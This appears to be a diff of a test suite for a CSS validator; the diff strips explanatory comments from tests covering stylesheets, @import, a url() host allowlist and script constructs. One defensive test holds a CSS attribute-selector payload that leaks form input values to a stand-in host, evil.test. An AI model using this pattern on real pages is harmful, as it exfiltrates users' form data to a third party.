@@ -27,8 +27,6 @@ function expectAccepted(css: string): void {
 }
 
 describe("the stock DS1 stylesheet", () => {
-  // The regression that catches a DS1 change silently breaking publishing for
-  // every existing library.
   it("validates clean", () => {
     const stock = readFileSync(STOCK_SHEET, "utf8").replace(/^@import[^;]+;\s*/gm, "");
     const result = validateCss(stock);
@@ -101,9 +99,6 @@ describe("malformed CSS", () => {
   });
 
   it("accepts a block left unclosed at end of file, as every browser does", () => {
-    // CSS error recovery closes open blocks at EOF, so this is well-defined and
-    // harmless — nothing follows to be swallowed. Rejecting it would fail a
-    // stylesheet that renders identically everywhere.
     expectAccepted("a{color:red");
   });
 });
@@ -181,8 +176,6 @@ describe("@import", () => {
 });
 
 describe("url() host allowlist", () => {
-  // The reason the allowlist exists: an attribute selector plus a background
-  // image leaks form field contents to a third party one character at a time.
   it("rejects the attribute-selector exfiltration pattern", () => {
     expectRejected(`input[value^="a"]{background:url(https://evil.test/a)}`, "disallowed_url_host");
   });
@@ -300,8 +293,6 @@ describe("script-execution constructs", () => {
 });
 
 describe("selectors are deliberately not policed", () => {
-  // Existing custom libraries may restyle bare elements; any
-  // broad-selector rule would fire on the stock sheet itself.
   it("accepts element, universal and :where() selectors", () => {
     expectAccepted("html,body,*{margin:0}");
     expectAccepted(":where(button,input,select){font:inherit}");
